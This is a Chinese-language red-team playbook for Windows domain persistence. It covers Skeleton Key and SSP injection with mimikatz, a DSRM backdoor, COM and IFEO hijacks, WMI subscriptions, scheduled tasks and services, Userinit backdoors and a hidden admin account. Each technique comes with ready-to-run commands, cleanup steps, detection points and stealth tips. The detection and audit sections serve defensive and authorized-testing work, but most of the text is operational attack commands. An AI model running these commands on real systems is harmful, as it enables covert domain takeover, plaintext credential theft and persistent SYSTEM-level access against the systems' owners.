# Windows 持久化

拿下单机/域控权限后的八种驻留手段。每种给三件套:**进入命令 → 清理命令 → 检测点**——报告里清理和检测必须成对出现,不留后门不收尾等于把把柄留在客户机上。事件 ID 默认指 Security 日志(4657 注册表值修改需开"注册表"对象访问审计);Sysmon 事件需目标装了 Sysmon 且配置开启对应类型。命令占位符用尖括号标注;bat 块 = cmd(`::`/`::::` 开头是注释),powershell 块 = PowerShell,bash 块 = mimikatz 交互环境或攻击机 Kali。

本文件工具:mimikatz(misc::skeleton、misc::memssp,本机 `~/tools/windows/mimikatz/x64/mimikatz.exe`)、mimilib.dll(同目录)、系统自带(ntdsutil、reg、sc、schtasks、WMI 三件套)。

实证说明:本篇 mimikatz 子命令 `misc::skeleton`、`misc::memssp` 已对本机 mimikatz.exe(2.2.0 x64 #19041,2022-09-19)逐一 `strings -el` 核验存在;`event::drop`/`event::clear`、`vault::cred`、`dpapi::cred`、`ts::mstsc` 的核验与用法见 13-Windows落地工具箱.md。SSP 日志文件名 `kiwissp.log` 取自同目录 `mimilib.dll` 内嵌字符串。

---

## Skeleton Key 骨架钥匙 — 域控内存注入万能密码(misc::skeleton)

原理:给 DC 的 LSASS 进程打内存补丁,注入一个万能密码(字面量 `mimikatz`),此后任何域账户凭这个密码都能通过该 DC 的 NTLM/Kerberos 认证,原密码照常可用;补丁在内存,DC 重启即失效。

来源:mimikatz(本机 `~/tools/windows/mimikatz/x64/mimikatz.exe`,先按 13 号文件传输小节送上 DC);misc::skeleton 模块已在二进制内 strings 实证(`kuhl_m_misc_skeleton`)

```bat
:::: DC 上(需本地管理员,最好 SYSTEM):先送 mimikatz 上去再运行
C:\Temp\mimikatz.exe
```

```bash
# === 进入 mimikatz 后执行 ===
privilege::debug          # 先拿 SeDebugPrivilege
misc::skeleton            # 给本机 LSASS 注入骨架钥匙;无 ERROR 行即成功生效
```

```bash
# 攻击机:任意域用户 + 万能密码 mimikatz 即可通过该 DC 认证(验证也是这条)
nxc smb <DC的IP> -u <任意域用户> -p mimikatz
# 4768(Kerberos 票据授予)/4624 照常成功;拿到访问后按 05 横向
```

清理命令:

```bat
:::: 无在线摘除手段——补丁在 LSASS 内存,重启 DC 即失效(重启动作留 6005/6006 事件)
shutdown /r /t 0
```

检测点:
- DC 内存取证:lsasrv.dll 内存代码与磁盘版本 diff(Skeleton Key 标准检测法)
- 行为侧证:同一账户"任意密码都能成功"——错误密码喷洒后突然全量成功,4624/4776 成功率异常
- Defender for Identity/ATA 的加密降级类告警对骨架钥匙场景有覆盖(以产品文档为准)
- 重启失效 → 事后取证难,重点在事前防护:LSASS PPL(见 13 的 RunAsPPL 节)

参数速查:
- `misc::skeleton` 无参数;万能密码固定为 `mimikatz`
- `nxc smb <DC> -u <用户> -p mimikatz` 万能密码用法与普通密码完全一致

注意: 只影响打补丁的这一台 DC(多 DC 环境逐台打才有全域效果);动静极大且全域生效,实战常用黄金票据替代(见 12-Kerberos深度利用.md);重启后需要有人重打——常配合计划任务/WMI 订阅(本篇)做"重启重打"循环;微软 2014 年起有专门检测公告,EDR 重点盯防。

---

## DSRM 后门 — 重置域控本地管理员密码 + 放开网络登录

原理:每台 DC 有个独立的本地账户 DSRM Administrator(目录服务还原模式账户,RID 500),域侧改密码动不到它——用 ntdsutil 重置它的密码,再改注册表允许它网络登录,即得一个"域管管不到的 DC 后门"。

来源:Windows 系统自带(ntdsutil、reg;net use 类登录均为系统组件);哈希传递用攻击机 nxc(apt 包)

```bat
:::: 1. 重置 DSRM 密码(DC 上管理员 cmd;输入不回显;"on server null"=本机)
ntdsutil
set dsrm password
reset password on server null
<新DSRM密码>
<重复输入一遍>
q
q
:::: 变体:把 DSRM 密码同步成某域账户的密码(该域账户哈希你已有,免再记一套):
::::   ntdsutil 交互内:set dsrm password → sync from domain account samaccount <域用户> → q → q
:::: 2. 放开 DSRM 网络登录(默认 0 只允许 DC 本地控制台;2 = 正常运行模式下也允许网络登录)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
```

```bash
# 攻击机:DC 上 mimikatz lsadump::sam 的 RID 500 行即 DSRM 哈希;或你自设的密码算 NTLM
# 用本地账户语义打 DC(--local-auth 关键,否则走域验证):
nxc smb <DC的IP> -u administrator -H <DSRM的NTLM哈希> --local-auth
```

清理命令:

```bat
:::: 1. 注册表改回默认(或直接删值,默认即 0)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 0 /f
reg delete HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /f
:::: 2. 再进 ntdsutil 重置一次 DSRM 密码(换成只有客户知道的新值,见上进入命令同流程)
```

检测点:
- 4657 / Sysmon 13:`HKLM\System\CurrentControlSet\Control\Lsa` 下 DSRMAdminLogonBehavior 值被写入(基线里默认没有这个值)
- 4688:ntdsutil 进程出现(正常运维极少用)
- DC 上 4624 LogonType 3 且账户是本地 SAM 账户(DC 上本不该有本地账户远程登录)
- 自查:`reg query HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior`,无值或非 0 为正常

参数速查:
- `ntdsutil → set dsrm password → reset password on server null` null=目标为本机 DC
- `sync from domain account samaccount <域用户>` DSRM 密码同步为域账户密码
- `DSRMAdminLogonBehavior`:0=仅控制台(默认)、1=仅 DSRM 恢复模式下允许网络登录、2=正常运行也允许网络登录(实战取 2)

注意: 需要在 DC 上有管理员权限;DSRM 账户改名/改密不影响域账户,蓝队巡检常漏;`--local-auth` 忘了打会拿域验证去撞,直接锁定域管理员账户,务必小心;同步法(sync from domain account)留下的哈希与域用户一致,域用户改密后即失效,重置法长期有效。

---

## COM 劫持 — HKCU 覆盖 CLSID 指向自 DLL(免管理员)

原理:COM 查找类时 HKCU\Software\Classes 优先于 HKLM 合并进 HKCR——在 HKCU 下建一个常用 CLSID 的同名 InprocServer32 指向自己的 DLL,进程实例化该 COM 对象时就加载你的 DLL,全程只写 HKCU、不要管理员。

来源:Windows 系统自带 reg.exe;示例 CLSID {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}(CAccPropServicesClass)来自 enigma0x3 公开研究,触发场景以原文为准 [待验证]

```bat
:::: 1. 先查原 HKLM 值留档(回滚用):任意 CLSID 皆可劫持,挑常被实例化的
reg query HKCR\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32 /ve
:::: 2. HKCU 下建同名键指向自 DLL(不需要管理员;ThreadingModel 跟原值走,通常 Apartment)
reg add HKCU\Software\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32 /ve /t REG_SZ /d "C:\Temp\evil.dll" /f
reg add HKCU\Software\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32 /v ThreadingModel /t REG_SZ /d "Apartment" /f
```

清理命令:

```bat
:::: 整键删除即还原(HKLM 原值从未被动过)
reg delete HKCU\Software\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7} /f
del C:\Temp\evil.dll
```

检测点:
- Sysmon 12/13:HKCU\Software\Classes\CLSID 下新建键/值(加 4657 需对象访问审计)
- Sysmon 7:同一 DLL 加载进多个不相关进程
- 自查:`reg query HKCU\Software\Classes\CLSID /s /f InprocServer32`(正常用户 hive 里几乎为空,有即审)
- Autoruns 的 COM 页签会对 HKCU 覆盖项标异常

参数速查:
- `/ve` 写默认值(DLL 路径就放在 InprocServer32 的默认值)
- `/v ThreadingModel /d "Apartment"` 线程模型,与被劫持对象的 HKLM 原值保持一致
- 挑 CLSID 思路:任务计划程序、Shell 扩展、凭据 UI 相关类(触发频繁)

注意: 唯一一个免管理员的常规持久化位;只对当前用户生效(SYSTEM 服务进程不走 HKCU);DLL 要导出 DllGetClassObject 且按 COM 语义干活,否则宿主进程报错——保活思路是 DLL 转发原功能或只做加载不破事;explorer.exe 实例化失败会弹错误框,动静反过来也算检测面。

---

## WMI 事件订阅 — 无文件三件套永久驻留(__EventFilter + Consumer + Binding)

原理:WMI 永久事件订阅存在系统 WMI 数据库里(不落盘、无自启键、无服务),过滤器条件满足时由 WmiPrvSE.exe(SYSTEM)执行消费者命令,重启存活,是隐蔽度最高的持久化之一。

来源:Windows 系统自带 PowerShell(Set-WmiInstance/Get-CimInstance,三件套类名 __EventFilter / CommandLineEventConsumer / __FilterToConsumerBinding 为系统标准类)

```powershell
# 三步装好(需管理员;Name 可伪装成运维向名字)
# 1. 过滤器:开机 4~5 分钟窗口触发一次(WQL 每 60 秒轮询 SystemUpTime)
$F = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments `
  @{Name='SysmonHelper'; EventNamespace='root\CimV2'; QueryLanguage='WQL';
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 305"}
# 2. 消费者:执行命令(由 WmiPrvSE.exe 以 SYSTEM 跑)
$C = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments `
  @{Name='SysmonHelper'; CommandLineTemplate='C:\Windows\System32\cmd.exe /c C:\Temp\evil.exe'}
# 3. 绑定两者(缺这步不生效)
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$F; Consumer=$C}
```

清理命令:

```powershell
# 反向三连(先拆绑定,再删过滤器与消费者;Name 换成你装的)
Get-CimInstance root\subscription -ClassName __FilterToConsumerBinding | Remove-CimInstance
Get-CimInstance root\subscription -ClassName __EventFilter -Filter "Name='SysmonHelper'" | Remove-CimInstance
Get-CimInstance root\subscription -ClassName CommandLineEventConsumer -Filter "Name='SysmonHelper'" | Remove-CimInstance
```

检测点:
- Sysmon 19/20/21:WMI 过滤器/消费者/绑定创建(需 Sysmon 配置开启 WMI 事件)
- 4688:父进程为 WmiPrvSE.exe 的进程创建(强 IOC)
- 自查三连:`Get-CimInstance root\subscription -ClassName __EventFilter/CommandLineEventConsumer/__FilterToConsumerBinding`(干净系统上 ActiveScriptEventConsumer/第三方过滤器极少)
- Microsoft-Windows-WMI-Activity/Operational 日志,永久事件注册相关事件约在 5857-5861 段 [待验证:具体 ID 以日志实采为准]
- 底层存储:%SystemRoot%\System32\wbem\Repository(整库快照比对可发现新增订阅)

参数速查:
- `Set-WmiInstance -Namespace root\subscription -Class <类> -Arguments @{...}` 三件套各自一条
- Query 触发条件可换:定时(INTERVAL 类)、用户登录(__InstanceCreationEvent WHERE TargetInstance ISA 'Win32_LogonSession')等
- `CommandLineTemplate` 用绝对路径;`Get-CimInstance ... | Remove-CimInstance` 通用清理套路

注意: 装订阅需要管理员;三件套缺一不可,清理也要删干净(残留绑定会在订阅失效时报 WMI 错误);PowerShell 深度日志(4103/4104)环境里安装动作全程留痕,装完即走;WmiPrvSE 落地执行是很多 EDR 的规则点,消费者命令尽量用系统 LOLBin 转一手。

---

## SSP 注入 — 登录明文落盘(misc::memssp 内存版 / mimilib.dll 持久版)

原理:往 LSA 塞一个自定义安全支持提供程序(SSP),此后每次交互式登录的账号明文密码都被写进 `C:\Windows\System32\kiwissp.log`(文件名实证自本机 mimilib.dll 内嵌字符串);内存版(misc::memssp)不落盘、重启失效,mimilib.dll 版写注册表、重启存活。

来源:mimikatz(本机 `~/tools/windows/mimikatz/x64/mimikatz.exe` + 同目录 `mimilib.dll`);misc::memssp 已 strings 实证(`kuhl_m_misc_memssp`)

```bash
# === 内存版:进入 mimikatz 后执行(管理员 + 先提权)===
privilege::debug
misc::memssp             # LSASS 内存打补丁注入伪 SSP;不写盘,重启失效
# 之后任何本地/域交互式登录,明文账密追加进 C:\Windows\System32\kiwissp.log
type C:\Windows\System32\kiwissp.log      # 这是 shell 命令,退出 mimikatz 后看
```

```bat
:::: 持久版(需管理员;重启存活):DLL 丢 System32 + 注册进 LSA 安全包清单
copy C:\Temp\mimilib.dll C:\Windows\System32\mimilib.dll
:::: 关键:Security Packages 是多字符串值,先查原值抄全,只在末尾追加 mimilib,别凭记忆重写
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages"
:::: 用查到的原值(如 kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u)整体重写并加 \0mimilib:
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
:::: 重启后生效;此后登录明文进 C:\Windows\System32\kiwissp.log
```

清理命令:

```bat
:::: 内存版:重启即消失(shutdown /r /t 0),无其他清理
:::: 持久版:还原注册表(按进入前抄下的原值重写)+ 删文件 + 再重启
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "<原多字符串值,如 kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u>" /f
del C:\Windows\System32\mimilib.dll
del C:\Windows\System32\kiwissp.log
shutdown /r /t 0
```

检测点:
- 4657 / Sysmon 13:Security Packages 值被改(白名单外多出任何包名都是高危)
- Sysmon 11 / 文件审计 4663:System32 新增 mimilib.dll;kiwissp.log 出现即实锤
- 登录成功后看 lsass 加载的 SSP 列表(EDR/自定义扫描比对)
- 内存版无文件痕迹,重点在 LSASS 内存扫描与 PPL 防护(见 13 的 RunAsPPL 节)

参数速查:
- `misc::memssp` 无参数,输出无 ERROR 即成功
- Security Packages(REG_MULTI_SZ)多字符串用 `\0` 分隔,reg add 会把字面 `\0` 转成真实分隔符
- 日志固定 `C:\Windows\System32\kiwissp.log`(lsass 工作目录)

注意: kiwissp.log 本身是铁证,收割后立刻删;重写 Security Packages 抄错一个包名可能导致开机无法登录(虚拟机先测);WDigest 明文(13 的 lsadump 前置思路)与本方法互补——环境开了 WDigest 缓存时 sekurlsa 直接出明文,没必要上 SSP。

---

## IFEO 劫持 — Image File Execution Options Debugger 粘滞键后门

原理:给 IFEO 键写 Debugger 值后,启动 sethc.exe(连按 5 次 Shift)等程序时系统实际启动的是"调试器"——登录界面连按 Shift 五次即得 SYSTEM 上下文执行,是登录屏幕级后门。

来源:Windows 系统自带 reg.exe(键路径为系统标准位置 HKLM\...\Image File Execution Options)

```bat
:::: 粘滞键后门(需管理员):锁屏/登录界面按 5 次 Shift → 启动的是你的 exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Temp\evil.exe" /f
:::: 变体:Win+U 的轻松访问(utilman.exe),锁屏 Win+U 触发
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
:::: 变体二:让任意程序启动即带后门进程(目标程序名自定义)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<目标程序.exe>" /v Debugger /t REG_SZ /d "C:\Temp\evil.exe" /f
```

清理命令:

```bat
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /f
:::: 键下没有其他值时可整键删:reg delete "...\sethc.exe" /f
```

检测点:
- 4657 / Sysmon 13:IFEO 路径下写入 Debugger 值(该键默认无 Debugger,出现即异常)
- 4688:进程创建日志里 sethc.exe/utilman.exe 请求但实际映像是别的 exe
- Autoruns 的 Image Hijacks 页签直接列出
- 自查:`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s /v Debugger`(应返回"找不到")

参数速查:
- `Debugger`(REG_SZ)填你的程序完整路径;系统启动原程序时改启动它并附原命令行
- 目标可换任意可执行文件名;辅助功能入口 sethc.exe / utilman.exe / osk.exe(屏幕键盘)最常用
- 登录界面(未登录状态)触发为 SYSTEM;已登录会话锁屏触发则为该用户上下文

注意: 需要管理员(HKLM);RDP 环境锁屏 Shift 五次同样触发,远程也吃这套;触发时登录界面拿到的 SYSTEM 等于域机器账户级权限的本地体现;蓝队对新版 Win10/11 有"GPO 禁用辅助功能快捷键"的对策,报告里注明适用面。

---

## 计划任务与服务 — schtasks /sc onlogon 与 sc create 开机驻留

原理:计划任务(登录/开机触发)和自启服务是最经典驻留位,系统自带、重启存活、可远程创建;onlogon 任务以 SYSTEM 执行任意程序,服务 binPath 指向 implant 即常驻。

来源:Windows 系统自带(schtasks.exe、sc.exe)

```bat
:::: 计划任务:任意用户登录即以 SYSTEM 执行(需管理员;/rl HIGHEST 给最高权限)
schtasks /create /tn "SystemUpdater" /tr "C:\Temp\evil.exe" /sc onlogon /ru SYSTEM /rl HIGHEST /f
:::: 远程创建(对别台机器,凭据给管理员):
schtasks /create /s <目标机IP> /u <域名>\<管理员> /p <密码> /tn "SystemUpdater" /tr "C:\Temp\evil.exe" /sc onlogon /ru SYSTEM /f
:::: 服务:开机自启 LocalSystem(需管理员;sc 参数等号后必须留一个空格)
sc create SystemUpdater binPath= "C:\Temp\evil.exe" start= auto obj= LocalSystem
sc start SystemUpdater
:::: 任务落地文件(自查/取证):C:\Windows\System32\Tasks\SystemUpdater(XML)
```

清理命令:

```bat
schtasks /delete /tn "SystemUpdater" /f
schtasks /delete /s <目标机IP> /u <域名>\<管理员> /p <密码> /tn "SystemUpdater" /f
sc stop SystemUpdater
sc delete SystemUpdater
del C:\Windows\System32\Tasks\SystemUpdater 2>nul
del C:\Temp\evil.exe
```

检测点:
- 4698/4700/4702:计划任务创建/启用/更新(Security 日志,需开"其他对象访问事件"审计子类)
- 7045:System 日志"安装了新服务"(服务版最直接的证据,SCM 记录)
- 4688 + Sysmon 1:任务/服务拉起的子进程(父进程 svchost.exe/taskeng)
- 自查:`schtasks /query /fo LIST /v | findstr /i "<可疑名>"`;`sc query`/`Get-Service`;System32\Tasks 目录新增 XML
- 任务名/服务名伪装成 Updater/HealthCheck 类是惯例,巡检时对"新近创建的自启项"全量过一遍

参数速查:
- `/sc onlogon` 登录触发;`/sc onstart` 开机触发(要 SYSTEM);`/ru SYSTEM` 以 SYSTEM 跑;`/rl HIGHEST` 最高完整性
- `/s /u /p` schtasks 远程三件;`/tn` 任务名 `/tr` 目标程序
- `binPath= / start= auto / obj= LocalSystem` 服务三参数(等号后空格不能省)
- 触发时间可换 `/sc daily /st 03:00` 深夜定时(避开办公时段)

注意: 最容易被基线巡检发现的两种持久化——报告必须原样记录任务名/服务名并收尾删除;服务程序要实现 SCM 协议(不响应 start 会超时报错,exe 直接跑用 `sc create ... start= demand` 手动起也行);schtasks 远程创建走 445,和 PsExec 一样留 4624 类型 3。

---

## 镜像账户与 Userinit 追加 — Winlogon 自启动链挂私货

原理:winlogon.exe 登录时按 Userinit 值(逗号分隔列表)逐个执行程序,默认只有 userinit.exe——在末尾追加自己的 exe 即每次登录执行;配合本地建一个与域账户同名的"镜像账户"扰乱视听,是老而有效的单机驻留。

来源:Windows 系统自带(reg.exe、net.exe;Winlogon 键为系统标准位置)

```bat
:::: 1. Userinit 追加(需管理员):整值重写,必须保留原 userinit.exe,只在后面追加!
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
:::: 查到原值一般是 C:\windows\system32\userinit.exe,重写为"原值,自启动程序":
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\windows\system32\userinit.exe,C:\Temp\evil.exe" /f
:::: 2. 镜像账户(可选):本地建一个与域账户同名的账户,登录界面难辨真伪
net user <与域账户同名的镜像用户> <密码> /add
net localgroup administrators <镜像用户> /add
```

清理命令:

```bat
:::: 1. Userinit 还原为默认值(把追加的逗号段去掉)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\windows\system32\userinit.exe" /f
:::: 2. 删镜像账户
net user <镜像用户> /delete
del C:\Temp\evil.exe
```

检测点:
- 4657 / Sysmon 13:Winlogon 键的 Userinit 值被改(基线值恒为单个 userinit.exe,多出逗号段即异常)
- 4688:父进程为 winlogon.exe 的非 userinit 子进程
- 4720:本地用户创建(镜像账户落地即记录)
- Autoruns 的 Logon 页签;`reg query ...\Winlogon /v Userinit` 自查一行流

参数速查:
- Userinit 值格式:`<路径>[,<路径>...]` 逗号分隔,依次执行
- 同键的 Shell 值(explorer.exe)同理可追加,但一改桌面就出问题,一般不动
- `net user <用户> <密码> /add` + `net localgroup administrators <用户> /add` 本地提权账户套路

注意: Userinit 写错(丢了原 userinit.exe)会导致下个登录用户配置文件加载失败,改前必须先 reg query 抄原值;镜像账户只在本机语境生效,RDP 登录界面显示同名账户,钓鱼/混淆价值大于权限价值;域内机器的本地账户哈希用 lsadump::sam 采集(见 13),配合 05 的 --local-auth 横向。

## 持久化面审计 — AdminSDHolder/影子凭据/非约束委派/krbtgt 重置周期(persist-audit.sh)

来源:`bin/persist-audit.sh`(四条 nxc ldap `--query` 只读自定义查询,语法以 `nxc ldap -h` 实测:`--query "<filter>" "<属性列表,空格分隔>"`)

**为什么这四条**:持久化落地必在 LDAP 留痕——AdminSDHolder 套娃(adminCount=1)、影子凭据(msDS-KeyCredentialLink 残留)、非约束委派(可截高权 TGT)、krbtgt 长期不重置(历史金票持续有效)。定期只读审计能发现别人(或自己上一轮)留下的后门。

```bash
# 项目上下文下结果自动落 <项目>/loot/persist-audit-<时间戳>.txt
PROJ_DIR=~/tools/projects/<名> persist-audit.sh <DC IP> <域名> <用户> <密码> [--proxy]
```

四个检测面:
- `(adminCount=1)`:AdminSDHolder 保护对象清点;**不在特权组却 adminCount=1** 的孤儿账户是经典后门(见 12 号⑪节)
- `(msDS-KeyCredentialLink=*)`:影子凭据残留;攻击后未清理的 KeyCredential 一览
- `(userAccountControl:1.2.840.113556.1.4.803:=524288)`:TRUSTED_FOR_DELEGATION 非约束委派主机;高权用户登录过即留下可复用 TGT
- krbtgt `pwdLastSet`:金票检测面;久远未重置说明历史金票仍有效(作废需 24h 内连续重置两次)

输出尾部 `PERSIST-AUDIT:` 汇总行进 redops 收割:影子凭据/非约束委派计数 >0 自动登记中危 finding(按标题去重)。

检测点(蓝队视角):
- 4738/5136:adminCount、msDS-KeyCredentialLink 属性变更
- krbtgt 重置:4742 账户管理事件 + 两次重置间隔监控
